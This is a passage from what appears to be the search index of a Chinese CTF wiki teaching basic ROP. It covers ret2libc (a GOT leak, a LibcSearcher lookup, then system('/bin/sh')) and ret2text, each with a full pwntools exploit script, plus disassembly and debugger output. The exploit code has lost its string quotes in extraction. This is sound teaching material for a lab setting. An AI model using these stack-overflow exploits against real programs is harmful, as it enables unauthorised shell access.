\n0\n;\n\n\n}\n\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u5982\u4f55\u5f97\u5230system\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u8fd9\u91cc\u5c31\u4e3b\u8981\u5229\u7528\u4e86\u4e24\u4e2a\u77e5\u8bc6\u70b9\n\n\n\n\nsystem\u51fd\u6570\u5c5e\u4e8elibc\uff0c\u800clibc.so\u6587\u4ef6\u4e2d\u7684\u51fd\u6570\u4e4b\u95f4\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\u3002\n\n\n\u5373\u4f7f\u7a0b\u5e8f\u6709ASLR\u4fdd\u62a4\uff0c\u4e5f\u53ea\u662f\u9488\u5bf9\u4e8e\u5730\u5740\u4e2d\u95f4\u4f4d\u8fdb\u884c\u968f\u673a\uff0c\u6700\u4f4e\u768412\u4f4d\u5e76\u4e0d\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u800clibc\u5728github\u4e0a\u6709\u4eba\u8fdb\u884c\u6536\u96c6\uff0c\u5177\u4f53\u7ec6\u8282\u5982\u4e0b\n\n\nhttps://github.com/niklasb/libc-database\n\n\n\n\n\u6240\u4ee5\u5982\u679c\u6211\u4eec\u77e5\u9053libc\u4e2d\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u786e\u5b9a\u8be5\u7a0b\u5e8f\u5229\u7528\u7684libc\u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u77e5\u9053system\u51fd\u6570\u7684\u5730\u5740\u3002\n\n\n\u90a3\u4e48\u5982\u4f55\u5f97\u5230libc\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\u5462\uff1f\u6211\u4eec\u4e00\u822c\u5e38\u7528\u7684\u65b9\u6cd5\u662f\u91c7\u7528got\u8868\u6cc4\u9732\uff0c\u5373\u8f93\u51fa\u67d0\u4e2a\u51fd\u6570\u5bf9\u5e94\u7684got\u8868\u9879\u7684\u5185\u5bb9\u3002\n\u5f53\u7136\uff0c\u7531\u4e8elibc\u7684\u5ef6\u8fdf\u7ed1\u5b9a\u673a\u5236\uff0c\u6211\u4eec\u9700\u8981\u9009\u62e9\u5df2\u7ecf\u6267\u884c\u8fc7\u7684\u51fd\u6570\u6765\u8fdb\u884c\u6cc4\u9732\u3002\n\n\n\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u6839\u636e\u4e0a\u9762\u7684\u6b65\u9aa4\u5148\u5f97\u5230libc\uff0c\u4e4b\u540e\u5728\u7a0b\u5e8f\u4e2d\u67e5\u8be2\u504f\u79fb\uff0c\u7136\u540e\u518d\u6b21\u83b7\u53d6system\u5730\u5740\uff0c\u4f46\u8fd9\u6837\u624b\u5de5\u64cd\u4f5c\u6b21\u6570\u592a\u591a\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2alibc\u7684\u5229\u7528\u5de5\u5177\uff0c\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003readme\n\n\n\n\nhttps://github.com/lieanu/LibcSearcher\n\n\n\n\n\u6b64\u5916\uff0c\u5728\u5f97\u5230libc\u4e4b\u540e\uff0c\u5176\u5b9elibc\u4e2d\u4e5f\u662f\u6709/bin/sh\u5b57\u7b26\u4e32\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e00\u8d77\u83b7\u5f97/bin/sh\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002\n\n\n\u8fd9\u91cc\u6211\u4eec\u6cc4\u9732__libc_start_main\u7684\u5730\u5740\uff0c\u8fd9\u662f\u56e0\u4e3a\u5b83\u662f\u7a0b\u5e8f\u6700\u521d\u88ab\u6267\u884c\u7684\u5730\u65b9\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u6cc4\u9732__libc_start_main\u5730\u5740\n\n\n\u83b7\u53d6libc\u7248\u672c\n\n\n\u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\n\n\n\u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f\n\n\n\u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u2018/bin/sh\u2019)\n\n\n\n\nexp\u5982\u4e0b\n\n\n##!/usr/bin/env python\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nfrom\n \nLibcSearcher\n \nimport\n \nLibcSearcher\n\n\nsh\n \n=\n \nprocess\n(\n./ret2libc3\n)\n\n\n\nret2libc3\n \n=\n \nELF\n(\n./ret2libc3\n)\n\n\n\nputs_plt\n \n=\n \nret2libc3\n.\nplt\n[\nputs\n]\n\n\nlibc_start_main_got\n \n=\n \nret2libc3\n.\ngot\n[\n__libc_start_main\n]\n\n\nmain\n \n=\n \nret2libc3\n.\nsymbols\n[\nmain\n]\n\n\n\nprint\n \nleak libc_start_main_got addr and return to main again\n\n\npayload\n \n=\n \nflat\n([\nA\n \n*\n \n112\n,\n \nputs_plt\n,\n \nmain\n,\n \nlibc_start_main_got\n])\n\n\nsh\n.\nsendlineafter\n(\nCan you find it !?\n,\n \npayload\n)\n\n\n\nprint\n \nget the related addr\n\n\nlibc_start_main_addr\n \n=\n \nu32\n(\nsh\n.\nrecv\n()[\n0\n:\n4\n])\n\n\nlibc\n \n=\n \nLibcSearcher\n(\n__libc_start_main\n,\n \nlibc_start_main_addr\n)\n\n\nlibcbase\n \n=\n \nlibc_start_main_addr\n \n-\n \nlibc\n.\ndump\n(\n__libc_start_main\n)\n\n\nsystem_addr\n \n=\n \nlibcbase\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nbinsh_addr\n \n=\n \nlibcbase\n \n+\n \nlibc\n.\ndump\n(\nstr_bin_sh\n)\n\n\n\nprint\n \nget shell\n\n\npayload\n \n=\n \nflat\n([\nA\n \n*\n \n104\n,\n \nsystem_addr\n,\n \n0xdeadbeef\n,\n \nbinsh_addr\n])\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\ntrain.cs.nctu.edu.tw ret2libc\n\n\n\n\nshell\u83b7\u53d6\u5c0f\u7ed3\n\n\n\u8fd9\u91cc\u603b\u7ed3\u51e0\u79cd\u5e38\u89c1\u7684\u83b7\u53d6shell\u7684\u65b9\u5f0f\uff1a\n\n\n\n\n\u6267\u884cshellcode\uff0c\u8fd9\u4e00\u65b9\u9762\u4e5f\u4f1a\u6709\u4e0d\u540c\u7684\u60c5\u51b5\n\n\n\u53ef\u4ee5\u76f4\u63a5\u8fd4\u56deshell\n\n\n\u53ef\u4ee5\u5c06shell\u8fd4\u56de\u5230\u67d0\u4e00\u4e2a\u7aef\u53e3\n\n\nshellcode\u4e2d\u5b57\u7b26\u6709\u65f6\u5019\u9700\u8981\u6ee1\u8db3\u4e0d\u540c\u7684\u9700\u6c42\n\n\n\u6ce8\u610f\uff0c\u6211\u4eec\u9700\u8981\u5c06shellcode\u5199\u5728\u53ef\u4ee5\u6267\u884c\u7684\u5185\u5b58\u533a\u57df\u4e2d\u3002\n\n\n\n\n\n\n\u6267\u884c system(\"/bin/sh\"), system('sh') \u7b49\u7b49\n\n\n\u5173\u4e8e system \u7684\u5730\u5740\uff0c\u53c2\u89c1\u4e0b\u9762\u7ae0\u8282\u7684\n\u5730\u5740\u5bfb\u627e\n\u3002\n\n\n\u5173\u4e8e \"/bin/sh\"\uff0c \u201csh\u201d\n\n\n\u9996\u5148\u5bfb\u627e binary \u91cc\u9762\u6709\u6ca1\u6709\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\n\u6bd4\u5982\u8bf4\u6709 flush \u51fd\u6570\uff0c\u90a3\u5c31\u4e00\u5b9a\u6709 sh \u4e86\n\n\n\u8003\u8651\u4e2a\u4eba\u8bfb\u53d6\u5bf9\u5e94\u5b57\u7b26\u4e32\n\n\nlibc \u4e2d\u5176\u5b9e\u662f\u6709 /bin/sh \u7684\n\n\n\n\n\n\n\u4f18\u70b9\n\n\n\u53ea\u9700\u8981\u4e00\u4e2a\u53c2\u6570\u3002\n\n\n\n\n\n\n\u7f3a\u70b9\n\n\n\u6709\u53ef\u80fd\u56e0\u4e3a\u7834\u574f\u73af\u5883\u53d8\u91cf\u800c\u65e0\u6cd5\u6267\u884c\u3002\n\n\n\n\n\n\n\n\n\n\n\u6267\u884c execve(\"/bin/sh\",NULL,NULL)\n\n\n\u524d\u51e0\u6761\u540c system\n\n\n\u4f18\u70b9\n\n\n\u51e0\u4e4e\u4e0d\u53d7\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\u3002\n\n\n\n\n\n\n\u7f3a\u70b9\n\n\n\u9700\u8981 3 \u4e2a\u53c2\u6570\u3002\n\n\n\n\n\n\n\n\n\n\n\u7cfb\u7edf\u8c03\u7528\n\n\n\u7cfb\u7edf\u8c03\u7528\u53f7 11\n\n\n\n\n\n\n\n\n\u5730\u5740\u5bfb\u627e\u5c0f\u7ed3\n\n\n\u5728\u6574\u4e2a\u6f0f\u6d1e\u5229\u7528\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u603b\u662f\u514d\u4e0d\u4e86\u8981\u53bb\u5bfb\u627e\u4e00\u4e9b\u5730\u5740\uff0c\u5e38\u89c1\u7684\u5bfb\u627e\u5730\u5740\u7684\u7c7b\u578b\uff0c\u6709\u5982\u4e0b\u51e0\u79cd\n\n\n\u901a\u7528\u5bfb\u627e\n\n\n\u76f4\u63a5\u5730\u5740\u5bfb\u627e\n\n\n\u7a0b\u5e8f\u4e2d\u5df2\u7ecf\u7ed9\u51fa\u4e86\u76f8\u5173\u53d8\u91cf\u6216\u8005\u51fd\u6570\u7684\u5730\u5740\u4e86\u3002\u8fd9\u65f6\u5019\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5229\u7528\u4e86\u3002\n\n\ngot\u8868\u5bfb\u627e\n\n\n\u6709\u65f6\u5019\u6211\u4eec\u5e76\u4e0d\u4e00\u5b9a\u975e\u5f97\u76f4\u63a5\u77e5\u9053\u67d0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u53ef\u4ee5\u5229\u7528GOT\u8868\u7684\u8df3\u8f6c\u5230\u5bf9\u5e94\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u7136\uff0c\u5982\u679c\u6211\u4eec\u975e\u5f97\u77e5\u9053\u8fd9\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528write\uff0cputs\u7b49\u8f93\u51fa\u51fd\u6570\u5c06GOT\u8868\u4e2d\u5730\u5740\u5904\u5bf9\u5e94\u7684\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff08\n\u524d\u63d0\u662f\u8fd9\u4e2a\u51fd\u6570\u5df2\u7ecf\u88ab\u89e3\u6790\u4e00\u6b21\u4e86\n\uff09\u3002\n\n\n\u6709libc\n\n\n\u76f8\u5bf9\u504f\u79fb\u5bfb\u627e\n\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u8003\u8651\u5229\u7528libc\u4e2d\u51fd\u6570\u7684\u57fa\u5730\u5740\u4e00\u6837\u8fd9\u4e2a\u7279\u6027\u6765\u5bfb\u627e\u4e86\u3002\u5176\u5b9e__libc_start_main\u5c31\u662flibc\u5728\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002\n\u6ce8\u610f\uff1a\u4e0d\u8981\u9009\u62e9\u6709wapper\u7684\u51fd\u6570\uff0c\u8fd9\u6837\u4f1a\u4f7f\u5f97\u51fd\u6570\u7684\u57fa\u5730\u5740\u8ba1\u7b97\u4e0d\u6b63\u786e\u3002\n\u5e38\u89c1\u7684\u6709wapper\u7684\u51fd\u6570\u6709\uff08\u5f85\u8865\u5145\uff09\u3002\n\n\n\u65e0libc\n\n\n\u5176\u5b9e\uff0c\u8fd9\u79cd\u60c5\u51b5\u7684\u89e3\u51b3\u7b56\u7565\u5206\u4e3a\u4e24\u79cd\n\n\n\n\n\u60f3\u529e\u6cd5\u83b7\u53d6libc\n\n\n\u60f3\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u5bf9\u5e94\u7684\u5730\u5740\u3002\n\n\n\n\n\u800c\u5bf9\u4e8e\u60f3\u8981\u6cc4\u9732\u7684\u5730\u5740\uff0c\u6211\u4eec\u53ea\u662f\u5355\u7eaf\u5730\u9700\u8981\u5176\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u6240\u4ee5puts\u548cwrite\u5747\u53ef\u4ee5\u3002\n\n\n\n\nputs\u4f1a\u6709\\x00\u622a\u65ad\u7684\u95ee\u9898\n\n\nwrite\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\u8f93\u51fa\u7684\u5185\u5bb9\u3002\n\n\n\n\n\u4e0b\u9762\u662f\u4e00\u4e9b\u76f8\u5e94\u7684\u65b9\u6cd5\n\n\nDynELF\n\n\n\u524d\u63d0\u662f\u6211\u4eec\u53ef\u4ee5\u6cc4\u9732\u4efb\u610f\u5730\u5740\u7684\u5185\u5bb9\u3002\n\n\n\n\n\u5982\u679c\u8981\u4f7f\u7528write\u51fd\u6570\u6cc4\u9732\u7684\u8bdd\uff0c\u4e00\u6b21\u6700\u597d\u591a\u8f93\u51fa\u4e00\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u6211\u4eec\u4e00\u822c\u662f\u53ea\u662f\u4e0d\u65ad\u5730\u5411\u9ad8\u5730\u5740\u8bfb\u5185\u5bb9\uff0c\u5f88\u6709\u53ef\u80fd\u5bfc\u81f4\u9ad8\u5730\u5740\u7684\u73af\u5883\u53d8\u91cf\u88ab\u8986\u76d6\uff0c\u5c31\u4f1a\u5bfc\u81f4shell\u4e0d\u80fd\u542f\u52a8\u3002\n\n\n\n\nlibc\u6570\u636e\u5e93\n\n\n## \u66f4\u65b0\u6570\u636e\u5e93\n\n./get\n\n## \u5c06\u5df2\u6709libc\u6dfb\u52a0\u5230\u6570\u636e\u5e93\u4e2d\n\n./add libc.so \n\n## Find all the libc\ns in the database that have the given names at the given addresses. \n\n./find function1 addr function2 addr\n\n## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.\n\n./Dump some useful offsets\n\n\n\n\n\u53bblibc\u7684\u6570\u636e\u5e93\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u548c\u5df2\u7ecf\u51fa\u73b0\u7684\u5730\u5740\u4e00\u6837\u7684libc\uff0c\u8fd9\u65f6\u5019\u5f88\u6709\u53ef\u80fd\u662f\u4e00\u6837\u7684\u3002\n\n\n\n\nlibcdb.com\n\n\n\n\n\u5f53\u7136\uff0c\u8fd8\u6709\u4e0a\u9762\u63d0\u5230\u7684https://github.com/lieanu/LibcSearcher\u3002\n\n\nret2dl-resolve\n\n\n\u5f53ELF\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\u65f6\uff0cgot\u8868\u4f1a\u91c7\u7528\u5ef6\u8fdf\u7ed1\u5b9a\u6280\u672f\u3002\u5f53\u7b2c\u4e00\u6b21\u8c03\u7528\u67d0\u4e2alibc\u51fd\u6570\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u8c03\u7528_dl_runtime_resolve\u51fd\u6570\u5bf9\u5176\u5730\u5740\u89e3\u6790\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u6784\u9020ROP\u94fe\uff0c\u4f2a\u9020\u5bf9\u5176\u4ed6\u51fd\u6570\uff08\u5982\uff1asystem\uff09\u7684\u89e3\u6790\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5728\u9ad8\u7ea7rop\u4e2d\u4f1a\u4ecb\u7ecd\u7684\u6280\u5de7\u3002\n\n\n\u9898\u76ee\n\n\n\n\ntrain.cs.nctu.edu.tw\n\n\nrop\n\n\n2013-PlaidCTF-ropasaurusrex\n\n\nDefcon 2015 Qualifier: R0pbaby\n\n\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\n\u4e4c\u4e91\u4e00\u6b65\u4e00\u6b65ROP\u7bc7(\u84b8\u7c73)\n\n\n\u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0a\uff09\n\n\n\u624b\u628a\u624b\u6559\u4f60\u6808\u6ea2\u51fa\u4ece\u5165\u95e8\u5230\u653e\u5f03\uff08\u4e0b\uff09\n\n\n \u3010\u6280\u672f\u5206\u4eab\u3011\u73b0\u4ee3\u6808\u6ea2\u51fa\u5229\u7528\u6280\u672f\u57fa\u7840\uff1aROP", 
            "title": "\u57fa\u672c ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#rop", 
            "text": "\u968f\u7740NX\u4fdd\u62a4\u7684\u5f00\u542f\uff0c\u4ee5\u5f80\u76f4\u63a5\u5411\u6808\u6216\u8005\u5806\u4e0a\u76f4\u63a5\u6ce8\u5165\u4ee3\u7801\u7684\u65b9\u5f0f\u96be\u4ee5\u7ee7\u7eed\u53d1\u6325\u6548\u679c\u3002\u653b\u51fb\u8005\u4eec\u4e5f\u63d0\u51fa\u6765\u76f8\u5e94\u7684\u65b9\u6cd5\u6765\u7ed5\u8fc7\u4fdd\u62a4\uff0c\u76ee\u524d\u4e3b\u8981\u7684\u662fROP(Return Oriented Programming)\uff0c\u5176\u4e3b\u8981\u601d\u60f3\u662f\u5728 \u6808\u7f13\u51b2\u533a\u6ea2\u51fa\u7684\u57fa\u7840\u4e0a(\u8fd9\u4e00\u6761\u4e4b\u540e\u4e0d\u518d\u91cd\u590d\u63d0\u53ca)\uff0c\u901a\u8fc7\u5229\u7528\u7a0b\u5e8f\u4e2d\u5df2\u6709\u7684\u5c0f\u7247\u6bb5(gadgets)\u6765\u6539\u53d8\u67d0\u4e9b\u5bc4\u5b58\u5668\u6216\u8005\u53d8\u91cf\u7684\u503c\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002 \u6240\u8c13gadgets\u5c31\u662f\u4ee5ret\u7ed3\u5c3e\u7684\u6307\u4ee4\u5e8f\u5217\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6307\u4ee4\u5e8f\u5217\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e9b\u5730\u5740\u7684\u5185\u5bb9\uff0c\u65b9\u4fbf\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002  \u4e4b\u6240\u4ee5\u79f0\u4e4b\u4e3aROP\uff0c\u662f\u56e0\u4e3a\u6838\u5fc3\u5728\u4e8e\u5229\u7528\u4e86\u6307\u4ee4\u96c6\u4e2d\u7684ret\u6307\u4ee4\uff0c\u6539\u53d8\u4e86\u6307\u4ee4\u6d41\u7684\u6267\u884c\u987a\u5e8f\u3002ROP\u653b\u51fb\u4e00\u822c\u5f97\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6   \u7a0b\u5e8f\u5b58\u5728\u6ea2\u51fa\uff0c\u5e76\u4e14\u53ef\u4ee5\u63a7\u5236\u8fd4\u56de\u5730\u5740\u3002  \u53ef\u4ee5\u627e\u5230\u6ee1\u8db3\u6761\u4ef6\u7684gadgets\u4ee5\u53ca\u76f8\u5e94gadgets\u7684\u5730\u5740\u3002\u5982\u679c\u5f53\u7a0b\u5e8f\u5f00\u542f\u4e86PIE\u4fdd\u62a4\uff0c\u90a3\u4e48\u5c31\u5fc5\u987b\u60f3\u529e\u6cd5\u6cc4\u9732gadgets\u7684\u5730\u5740\u4e86\u3002", 
            "title": "\u57fa\u672cROP"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2text", 
            "text": "", 
            "title": "ret2text"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_1", 
            "text": "ret2text\u5373\u9700\u8981\u6211\u4eec\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u7a0b\u5e8f\u672c\u8eab\u5df2\u6709\u7684\u7684\u4ee3\u7801(.text)\u3002\u5176\u5b9e\uff0c\u8fd9\u79cd\u653b\u51fb\u65b9\u6cd5\u662f\u4e00\u79cd\u7b3c\u7edf\u7684\u63cf\u8ff0\u3002\u6211\u4eec\u63a7\u5236\u6267\u884c\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801\u7684\u65f6\u5019\u4e5f\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u597d\u51e0\u6bb5\u4e0d\u76f8\u90bb\u7684\u7a0b\u5e8f\u5df2\u6709\u7684\u4ee3\u7801(\u4e5f\u5c31\u662fgadgets)\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u6240\u8981\u8bf4\u7684rop\u3002  \u8fd9\u65f6\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u5bf9\u5e94\u8fd4\u56de\u7684\u4ee3\u7801\u7684\u4f4d\u7f6e\u3002\u5f53\u7136\u7a0b\u5e8f\u4e5f\u53ef\u80fd\u4f1a\u5f00\u542f\u67d0\u4e9b\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u53bb\u7ed5\u8fc7\u8fd9\u4e9b\u4fdd\u62a4\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_2", 
            "text": "\u5176\u5b9e\uff0c\u5728\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u539f\u7406\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u8fd9\u4e00\u7b80\u5355\u7684\u653b\u51fb\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u518d\u7ed9\u51fa\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\uff0cbamboofox\u4e2d\u4ecb\u7ecdROP\u65f6\u4f7f\u7528\u7684ret2text\u7684\u4f8b\u5b50\u3002  \u70b9\u51fb\u4e0b\u8f7d:  ret2text  \u9996\u5148\uff0c\u67e5\u770b\u4e00\u4e0b\u7a0b\u5e8f\u7684\u4fdd\u62a4\u673a\u5236  \u279c  ret2text checksec ret2text\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u662f32\u4f4d\u7a0b\u5e8f\uff0c\u5176\u4ec5\u4ec5\u5f00\u542f\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u4fdd\u62a4\u3002\u7136\u540e\uff0c\u6211\u4eec\u4f7f\u7528IDA\u6765\u67e5\u770b\u6e90\u4ee3\u7801\u3002  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   v4 ;   // [sp+1Ch] [bp-64h]@1 \n\n   setvbuf ( stdout ,   0 ,   2 ,   0 ); \n   setvbuf ( _bss_start ,   0 ,   1 ,   0 ); \n   puts ( There is something amazing here, do you know anything? ); \n   gets (( char   * ) v4 ); \n   printf ( Maybe I will tell you next time ! ); \n   return   0 ;  }   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5728\u4e3b\u51fd\u6570\u4e2d\u4f7f\u7528\u4e86gets\u51fd\u6570\uff0c\u663e\u7136\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u6b64\u540e\u53c8\u53d1\u73b0  .text: 080485 FD   secure            proc   near  .text: 080485 FD  .text: 080485 FD   input             =   dword   ptr   - 10 h  .text: 080485 FD   secretcode        =   dword   ptr   - 0 Ch  .text: 080485 FD  .text: 080485 FD                   push      ebp  .text: 080485 FE                   mov       ebp ,   esp  .text: 08048600                   sub       esp ,   28 h  .text: 08048603                   mov       dword   ptr   [ esp ],   0   ; timer  .text : 0804860 A                   call      _time  .text: 0804860 F                   mov       [ esp ],   eax        ; seed  .text : 08048612                   call      _srand  .text: 08048617                   call      _rand  .text: 0804861 C                   mov       [ ebp + secretcode ],   eax  .text: 0804861 F                   lea       eax ,   [ ebp + input ]  .text: 08048622                   mov       [ esp + 4 ],   eax  .text: 08048626                   mov       dword   ptr   [ esp ],   offset   unk_8048760  .text: 0804862 D                   call      ___isoc99_scanf  .text: 08048632                   mov       eax ,   [ ebp + input ]  .text: 08048635                   cmp       eax ,   [ ebp + secretcode ]  .text: 08048638                   jnz       short   locret_8048646  .text: 0804863 A                   mov       dword   ptr   [ esp ],   offset   command   ;  /bin/sh  .text : 08048641                   call      _system   \u5728secure\u51fd\u6570\u53c8\u53d1\u73b0\u4e86\u5b58\u5728\u8c03\u7528system(\"/bin/sh\")\u7684\u4ee3\u7801\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u81f30x0804863A\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5f97\u5230\u7cfb\u7edf\u7684shell\u4e86\u3002  \u4e0b\u9762\u5c31\u662f\u6211\u4eec\u5982\u4f55\u6784\u9020payload\u4e86\uff0c\u9996\u5148\u9700\u8981\u786e\u5b9a\u7684\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5185\u5b58\u5730\u5740\u8ddd\u79bbmain\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5b57\u8282\u6570\u3002  .text: 080486 A7                   lea       eax ,   [ esp + 1 Ch ]  .text: 080486 AB                   mov       [ esp ],   eax        ; s  .text : 080486 AE                   call      _gets   \u53ef\u4ee5\u770b\u5230\u8be5\u5b57\u7b26\u4e32\u662f\u901a\u8fc7\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u5c06\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u67e5\u770besp\uff0cebp\uff0c\u5982\u4e0b  gef\u27a4  b *0x080486AE\nBreakpoint  1  at 0x80486ae: file ret2text.c, line  24 .\ngef\u27a4  r\nThere is something amazing here,  do  you know anything?\n\nBreakpoint  1 , 0x080486ae in main  ()  at ret2text.c:24 24       gets ( buf ) ; \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  registers  ] \u2500\u2500\u2500\u2500 $eax    : 0xffffcd5c  \u2192  0x08048329  \u2192   __libc_start_main  $ebx    : 0x00000000 $ecx    : 0xffffffff $edx    : 0xf7faf870  \u2192  0x00000000 $esp    : 0xffffcd40  \u2192  0xffffcd5c  \u2192  0x08048329  \u2192   __libc_start_main  $ebp    : 0xffffcdc8  \u2192  0x00000000 $esi    : 0xf7fae000  \u2192  0x001b1db0 $edi    : 0xf7fae000  \u2192  0x001b1db0 $eip    : 0x080486ae  \u2192   main+102  call 0x8048460  gets@plt   \u53ef\u4ee5\u770b\u5230esp\u4e3a0xffffcd40\uff0cebp\u4e3a\u5177\u4f53\u7684payload\u5982\u4e0b0xffffcdc8\uff0c\u540c\u65f6s\u76f8\u5bf9\u4e8eesp\u7684\u7d22\u5f15\u4e3a[esp+0x1c]\uff0c\u6240\u4ee5\uff0cs\u7684\u5730\u5740\u4e3a0xffffcd5c\uff0c\u6240\u4ee5s\u76f8\u5bf9\u4e8eebp\u7684\u504f\u79fb\u4e3a0x6C\uff0c\u6240\u4ee5\u76f8\u5bf9\u4e8e\u8fd4\u56de\u5730\u5740\u7684\u504f\u79fb\u4e3a0x6c+4\u3002  \u6700\u540e\u7684payload\u5982\u4e0b\uff1a  ##!/usr/bin/env python  from   pwn   import   *  sh   =   process ( ./ret2text )  target   =   0x804863a  sh . sendline ( A   *   ( 0x6c + 4 )   +   p32 ( target ))  sh . interactive ()", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_3", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#ret2shellcode", 
            "text": "", 
            "title": "ret2shellcode"
        }, 
        {
            "location": "/pwn/stackoverflow/basic_rop/#_4", 
